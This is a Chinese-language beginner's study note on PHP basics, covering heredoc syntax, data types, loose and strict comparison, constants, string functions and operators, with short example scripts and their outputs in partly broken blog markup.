title="条件："></a><strong>条件：</strong></h4><ul><li><p><strong>必须后面衔接分号，否则编译不通过</strong></p></li><li><p><strong>EOF可以用其他的字符代替，只需要保证结束表示和开始表示一致即可</strong></p></li><li><p><strong>结束标识必须独自占一行（即必须从行首开始，前后不能衔接多余空白*且前后不能空格</strong></p></li><li><p><strong>开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。</strong></p></li><li><p><strong>内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &lt;&lt;&lt;EOF</span><br><span class="line">&lt;p&gt;哈哈&lt;/p&gt;</span><br><span class="line">&lt;p&gt;你猜&lt;/p&gt;</span><br><span class="line">哈哈哈&lt;br&gt;</span><br><span class="line">你猜我让你猜什么&lt;br&gt;</span><br><span class="line">EOF</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>在这里的时候</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;是换行的</span><br><span class="line">&lt;p&gt;是便是一段的</span><br></pre></td></tr></table></figure><p><strong><img src="https://s2.loli.net/2023/07/01/LPev5w7u8BhXzga.png" alt="202371144329.png"></strong></p></li></ul><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h4><ul><li><p><strong>以&lt;&lt;&lt;EOF为开始标记开始，以EOF结束标记结束，结束标语必须顶头写，不能有任何的缩进和空格，且在结束标记末尾要有分号</strong></p></li><li><p><strong>开始标记和结束标记相同，不局限于EOF,EOO,EOD,EOT什么的也可以，只要保证结束标记和开始标记不出现在正文中皆可以了</strong></p></li><li><p><strong>于开始标记和结束标记之间的变量可以被正常解析，但是函数则不可以。在 heredoc 中，变量不需要用连接符 . 或 , 来拼接</strong></p></li><li><p><strong>后面的好像解析的时候自己解析乱了了，如果想继续看的话可以转（算是光明正得的水一波自己的笔记</strong></p></li><li><p><strong><a href="https://note.youdao.com/s/74MKWr93">https://note.youdao.com/s/74MKWr93</a></strong></p></li><li><p>```<br>&lt;?php<br>$a=”歪比”;<br>$name= &lt;&lt;&lt;EOF</p><pre><code>&quot;abc&quot;$a&quot;123&quot;&lt;br&gt;</code></pre><p>EOF;</p><p>echo $name;<br>?&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  **![202371144653.png](https://s2.loli.net/2023/07/01/IyLY5JsgKfHeDZE.png)**</span><br><span class="line"></span><br><span class="line">## **PHP数据类型**</span><br><span class="line"></span><br><span class="line">**PHP变量存储不同的数据类型，支持**</span><br><span class="line"></span><br><span class="line">- **String（字符串）**</span><br><span class="line">- **Integer（整型）**</span><br><span class="line">- **Float（浮点型）**</span><br><span class="line">- **Boolean（布尔型）**</span><br><span class="line">- **Array（数组）**</span><br><span class="line">- **Object（对象）**</span><br><span class="line">- **NULL（空值）**</span><br><span class="line">- **Resource（资源类型）**</span><br><span class="line"></span><br><span class="line">#### **PHP字符串**</span><br><span class="line"></span><br><span class="line">**一个字符串就是一串字符的序列**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;?php<br>$x = “Helloworld!”;<br>echo $x;<br>echo “<br>“;<br>$x = ‘Helloworld!’;<br>echo $x;<br>?&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**标准输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Helloworld!<br>Helloworld!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP整型**</span><br><span class="line"></span><br><span class="line">**没有小数点的整数**</span><br><span class="line"></span><br><span class="line">- **整数必须至少有一个数字 (0-9)**</span><br><span class="line">- **整数不能包含逗号或空格**</span><br><span class="line">- **整数是没有小数点的**</span><br><span class="line">- **整数可以是正数或负数**</span><br><span class="line">- **整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;?php<br>$x = 5985;<br>var_dump($x);<br>echo “<br>“;<br>$x = -345; // 负数<br>var_dump($x);<br>echo “<br>“;<br>$x = 0x8C; // 十六进制数<br>var_dump($x);<br>echo “<br>“;<br>$x = 047; // 八进制数<br>var_dump($x);<br>?&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**var_dump（）函数打印输入的字符和其数据类型，**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>int(5985)<br>int(-345)<br>int(140)<br>int(39)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**上面四种都是int所以都输出int**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;?php<br>$b = 3.1;<br>$c = true;<br>var_dump($b, $c);<br>?&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>float(3.1) bool(true)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP 浮点型**</span><br><span class="line"></span><br><span class="line">**浮点数是带小数部分的数字，或是指数形式。**</span><br><span class="line"></span><br><span class="line">**具体来说和上面的整型差不多**</span><br><span class="line"></span><br><span class="line">#### **PHP布尔型**</span><br><span class="line"></span><br><span class="line">**布尔型就是TRUE和FALSE**</span><br><span class="line"></span><br><span class="line">**布尔型常用语条件判断**</span><br><span class="line"></span><br><span class="line">#### **PHP数组**</span><br><span class="line"></span><br><span class="line">**数组可以在一个变量中存储多个值**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;?php<br>$cars=array(“Volvo”,”BMW”,”Toyota”);<br>var_dump($cars);<br>?&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>array(3) { [0]=&gt; string(5) “Volvo” [1]=&gt; string(3) “BMW” [2]=&gt; string(6) “Toyota” }</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**这里的话应该是array数组类型，里面存有三个值，**</span><br><span class="line"></span><br><span class="line">**【0】位置也就是正常的第一个里面是一个有五个字符的字符串volvo，**</span><br><span class="line"></span><br><span class="line">**以此类推**</span><br><span class="line"></span><br><span class="line">#### **PHP对象**</span><br><span class="line"></span><br><span class="line">**对象数据类型也可以用于存储数据**</span><br><span class="line"></span><br><span class="line">**在PHP中，对象必须声明**</span><br><span class="line"></span><br><span class="line">**首先你要用class函数声明类对象。类是可以包含属性和方法的结构。**</span><br><span class="line"></span><br><span class="line">**然后定义数据类型并在实例化的类中使用数据类型。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;?php<br>class Car<br>{<br>    var $color;<br>    function __construct($color=”green”) {<br>      $this-&gt;color = $color;<br>    }<br>    function what_color() {<br>      return $this-&gt;color;<br>    }<br>}</p><p>function print_vars($obj) {<br>   foreach (get_object_vars($obj) as $prop =&gt; $val) {<br>     echo “\t$prop = $val\n”;<br>   }<br>}</p><p>// 实例一个对象<br>$herbie = new Car(“white”);</p><p>// 显示 herbie 属性<br>echo “\therbie: Properties\n”;<br>print_vars($herbie);</p><p>?&gt;  </p><p>&lt;/body&gt;<br>&lt;/html&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><br>class：定义一个类。<br>Car：类名为 Car。<br>var：定义一个变量。<br>$color：一个名为 $color 的变量。<br>__construct：构造函数，用于创建类的实例时自动执行的方法。<br>function：定义一个函数。<br>what_color：函数名为 what_color。<br>return：函数返回值的关键字。<br>$this：指向当前对象的引用。<br>print_vars：函数名为 print_vars。<br>$obj：一个名为 $obj 的变量。<br>foreach：循环结构用于遍历数组或对象的每个元素。<br>get_object_vars：返回对象的属性和值的关联数组。<br>$prop：一个在循环过程中用来存储属性名的变量。<br>$val：一个在循环过程中用来存储属性值的变量。<br>echo：输出函数用于打印文本。<br>new：创建一个新的对象实例。<br>Car(“white”)：用 Car 类创建一个新的对象，并将颜色参数设置为 “white”。<br>herbie：变量名为 herbie。<br>Properties：文本字符串 “ Properties”。<br>print_vars($herbie)：调用 print_vars 函数，并将 herbie 传递给它作为参数。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>herbie: Properties color = white<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP-NULL值**</span><br><span class="line"></span><br><span class="line">**NULL表示变量没有值。NULL是数据类型为NULL的值。**</span><br><span class="line"></span><br><span class="line">**NULL值表示一个变量是否为空值。同样可以用于数值空值和NULL值的区别。**</span><br><span class="line"></span><br><span class="line">**可以通过设置变量值为NULL来清空变量数据。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>$x=”Hello world!”;<br>$x=null;<br>var_dump($x);<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>NULL<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP资源类型**</span><br><span class="line"></span><br><span class="line">**PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。**</span><br><span class="line"></span><br><span class="line">**常见资源数据类型有打开文件、数据库连接、图形画布区域等。**</span><br><span class="line"></span><br><span class="line">**由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义。**</span><br><span class="line"></span><br><span class="line">**使用 get_resource_type() 函数可以返回资源（resource）类型：**</span><br><span class="line"></span><br><span class="line">**get_resource_type(resource $handle): string**</span><br><span class="line">**此函数返回一个字符串，用于表示传递给它的 resource 的类型。如果参数不是合法的 resource，将产生错误。**</span><br><span class="line"></span><br><span class="line">**简单来说,php资源类型变量就是用来打开文件、数据库连接、图形化部区域等的一种特殊变量。**</span><br><span class="line"></span><br><span class="line">## **PHP类型比较**</span><br><span class="line"></span><br><span class="line">**PHP是弱类型语言，但是也要进行比较**</span><br><span class="line"></span><br><span class="line">**松散比较：==的比较，只比较值不比较类型**</span><br><span class="line"></span><br><span class="line">**严格比较：===的比较，比较值和类型**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>if(66==”66”){<br>    echo “1.值相等”;<br>}<br>echo PHP_EOL;</p><p>if(66===”66”){<br>    echo “2.类型相等”;<br>}else{<br>    echo”3.类型不相等”;<br>}<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**这里面的PHP_EOL是换行符，后面应该会写的**</span><br><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>1.值相等 3.类型不相等<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**PHP中比较0、false、null**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>echo ‘0 == false: ‘;<br>var_dump(0 == false);<br>echo ‘0 === false: ‘;<br>var_dump(0 === false);<br>echo PHP_EOL;<br>echo ‘0 == null: ‘;<br>var_dump(0 == null);<br>echo ‘0 === null: ‘;<br>var_dump(0 === null);<br>echo PHP_EOL;<br>echo ‘false == null: ‘;<br>var_dump(false == null);<br>echo ‘false === null: ‘;<br>var_dump(false === null);<br>echo PHP_EOL;<br>echo ‘“0” == false: ‘;<br>var_dump(“0” == false);<br>echo ‘“0” === false: ‘;<br>var_dump(“0” === false);<br>echo PHP_EOL;<br>echo ‘“0” == null: ‘;<br>var_dump(“0” == null);<br>echo ‘“0” === null: ‘;<br>var_dump(“0” === null);<br>echo PHP_EOL;<br>echo ‘“” == false: ‘;<br>var_dump(“” == false);<br>echo ‘“” === false: ‘;<br>var_dump(“” === false);<br>echo PHP_EOL;<br>echo ‘“” == null: ‘;<br>var_dump(“” == null);<br>echo ‘“” === null: ‘;<br>var_dump(“” === null);<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>0 == false: bool(true)<br>0 === false: bool(false)</p><p>0 == null: bool(true)<br>0 === null: bool(false)</p><p>false == null: bool(true)<br>false === null: bool(false)</p><p>“0” == false: bool(true)<br>“0” === false: bool(false)</p><p>“0” == null: bool(false)<br>“0” === null: bool(false)</p><p>“” == false: bool(true)<br>“” === false: bool(false)</p><p>“” == null: bool(true)<br>“” === null: bool(false)<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**PHP中比较图**</span><br><span class="line"></span><br><span class="line">**https://www.runoob.com/wp-content/uploads/2019/05/xxxxphp.png**</span><br><span class="line"></span><br><span class="line">## **PHP常量**</span><br><span class="line"></span><br><span class="line">**常量是一个简单值的标识符，该数值在脚本中不能改变**</span><br><span class="line"></span><br><span class="line">**一个常来那个使用英文字幕，下划线和数字组成，但数字不能作为首字母出现。（常量名不需要加 $ 修饰符)。**</span><br><span class="line"></span><br><span class="line">**常量在整个脚本中都可以使用。**</span><br><span class="line"></span><br><span class="line">**语法**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- **name：必选参数，常量名称，即标志符。**</span><br><span class="line"></span><br><span class="line">- **value：必选参数，常量的值。**</span><br><span class="line"></span><br><span class="line">- **case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。**</span><br><span class="line"></span><br><span class="line">  **注意：自 PHP 7.3.0 开始，定义不区分大小写的常量已被弃用。从 PHP 8.0.0 开始，只有 false 是可接受的值，传递 true 将产生一个警告。**</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>define(“aha”,”有意思捏”);<br>echo aha;<br>echo ‘<br>‘;<br>echo greeting；<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**这里的话定义了一个常量aha=有意思捏**</span><br><span class="line"></span><br><span class="line">**greeting没有被定义应该会给出警告但还是会出现**</span><br><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>有意思捏</p><p>Warning: Use of undefined constant greeting； - assumed ‘greeting；’ (this will throw an Error in a future version of PHP) in D:\Ctf\phpStudy_64\phpstudy_pro\WWW\php\测试.php on line 5<br>greeting；<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **常量一经定义就是全局的**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>define(“GREETING”, “欢迎访问 Runoob.com”);</p><p>function myTest() {<br>    echo GREETING;<br>}</p><p>myTest();    // 输出 “欢迎访问 Runoob.com”<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><br>欢迎访问 Runoob.com<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## **PHP字符串变量**</span><br><span class="line"></span><br><span class="line">**字符串变量用来包含有字符串的值**</span><br><span class="line"></span><br><span class="line">**在创建字符串之后，我们就可以对其进行操作，直接使用或者存储起来。**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>$txt=”Hello World”;<br>echo $txt;<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出:**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>Hello World<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP并置运算符**</span><br><span class="line"></span><br><span class="line">**并置运算符.将两个字符串值连接起来**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>$txt1=”Hello World”;<br>$txt2=”hello 个锤子”;<br>echo $txt1 . “ “ . $txt2;<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>Hello World hello 个锤子<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP strlen()函数**</span><br><span class="line"></span><br><span class="line">**strlen函数返回字符串的长度（字节数）**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>$txt1=”Hello World<br>“;<br>$txt2=”hello 个锤子<br>“;<br>echo $txt1 . “ “ . $txt2;<br>echo strlen($txt1);<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>Hello World<br>hello 个锤子<br>15<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **PHP strpos函数**</span><br><span class="line"></span><br><span class="line">**strpos函数用于在字符串中查找一段指定的文本或者一个字符**</span><br><span class="line"></span><br><span class="line">**如果找到了就会返回第一个匹配的字符位置。如果没找到就会返回FALSE**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>&lt;?php<br>$txt1=”Hello World<br>“;<br>$txt2=”hello 个锤子<br>“;<br>echo strpos($txt1,$txt2);</p><p>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试结果**</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**（上面没有忘了写，就是空白**</span><br><span class="line"></span><br><span class="line">## **PHP运算符**</span><br><span class="line"></span><br><span class="line">#### **PHP算术运算符**</span><br><span class="line"></span><br><span class="line">**+-*/%加减乘除取余**</span><br><span class="line"></span><br><span class="line">**-x设置负数和取反**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;?php<br>$x=100;<br>$y=6;<br>echo($x+$y);<br>echo(“<br>“);</p><p>echo($x-$y);<br>echo(“<br>“);</p><p>echo($x*$y);<br>echo(“<br>“);</p><p>echo($x/$y);<br>echo(“<br>“);</p><p>echo($x%$y);<br>echo(“<br>“);</p><p>echo(-$y);<br>?&gt;<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>106<br>94<br>600<br>16.666666666667<br>4<br>-6<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### **PHP 赋值运算符**</span><br><span class="line"></span><br><span class="line">**在 PHP 中，基本的赋值运算符是 =。它意味着左操作数被设置为右侧表达式的值。也就是说，$x = 5 的值是 5。**</span><br><span class="line"></span><br><span class="line">#### **PHP 递增/递减运算符**</span><br><span class="line"></span><br><span class="line">| **运算符** | **名称**   | **描述**                |</span><br><span class="line">| :--------- | :--------- | :---------------------- |</span><br><span class="line">| **++ x**   | **预递增** | **x 加 1，然后返回 x**  |</span><br><span class="line">| **x ++**   | **后递增** | **返回 x，然后 x 加 1** |</span><br><span class="line">| **-- x**   | **预递减** | **x 减 1，然后返回 x**  |</span><br><span class="line">| **x --**   | **后递减** | **返回 x，然后 x 减 1** |</span><br><span class="line"></span><br><span class="line">#### **PHP 比较运算符**</span><br><span class="line"></span><br><span class="line">**比较操作符可以比较两个值：**</span><br><span class="line"></span><br><span class="line">| **运算符**  | **名称**       | **描述**                                           | **实例**               |</span><br><span class="line">| :---------- | :------------- | :------------------------------------------------- | :--------------------- |</span><br><span class="line">| **x == y**  | **等于**       | **如果 x 等于 y，则返回 true**                     | **5==8 返回 false**    |</span><br><span class="line">| **x === y** | **绝对等于**   | **如果 x 等于 y，且它们类型相同，则返回 true**     | **5===&quot;5&quot; 返回 false** |</span><br><span class="line">| **x != y**  | **不等于**     | **如果 x 不等于 y，则返回 true**                   | **5!=8 返回 true**     |</span><br><span class="line">| **x &lt;&gt; y**  | **不等于**     | **如果 x 不等于 y，则返回 true**                   | **5&lt;&gt;8 返回 true**     |</span><br><span class="line">| **x !== y** | **不绝对等于** | **如果 x 不等于 y，或它们类型不相同，则返回 true** | **5!==&quot;5&quot; 返回 true**  |</span><br><span class="line">| **x &gt; y**   | **大于**       | **如果 x 大于 y，则返回 true**                     | **5&gt;8 返回 false**     |</span><br><span class="line">| **x &lt; y**   | **小于**       | **如果 x 小于 y，则返回 true**                     | **5&lt;8 返回 true**      |</span><br><span class="line">| **x &gt;= y**  | **大于等于**   | **如果 x 大于或者等于 y，则返回 true**             | **5&gt;=8 返回 false**    |</span><br><span class="line">| **x &lt;= y**  | **小于等于**   | **如果 x 小于或者等于 y，则返回 true**             | **5&lt;=8 返回 true**     |</span><br><span class="line"></span><br><span class="line">#### **PHP 逻辑运算符**</span><br><span class="line"></span><br><span class="line">| **运算符**   | **名称** | **描述**                                         | **实例**                                 |</span><br><span class="line">| :----------- | :------- | :----------------------------------------------- | :--------------------------------------- |</span><br><span class="line">| **x and y**  | **与**   | **如果 x 和 y 都为 true，则返回 true**           | **x=6 y=3 (x &lt; 10 and y &gt; 1) 返回 true** |</span><br><span class="line">| **x or y**   | **或**   | **如果 x 和 y 至少有一个为 true，则返回 true**   | **x=6 y=3 (x==6 or y==5) 返回 true**     |</span><br><span class="line">| **x xor y**  | **异或** | **如果 x 和 y 有且仅有一个为 true，则返回 true** | **x=6 y=3 (x==6 xor y==3) 返回 false**   |</span><br><span class="line">| **x &amp;&amp; y**   | **与**   | **如果 x 和 y 都为 true，则返回 true**           | **x=6 y=3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true**  |</span><br><span class="line">| **x \|\| y** | **或**   | **如果 x 和 y 至少有一个为 true，则返回 true**   | **x=6 y=3 (x==5 \|\| y==5) 返回 false**  |</span><br><span class="line">| **! x**      | **非**   | **如果 x 不为 true，则返回 true**                | **x=6 y=3 !(x==y) 返回 true**            |</span><br><span class="line"></span><br><span class="line">#### **PHP 数组运算符**</span><br><span class="line"></span><br><span class="line">| **运算符**  | **名称**   | 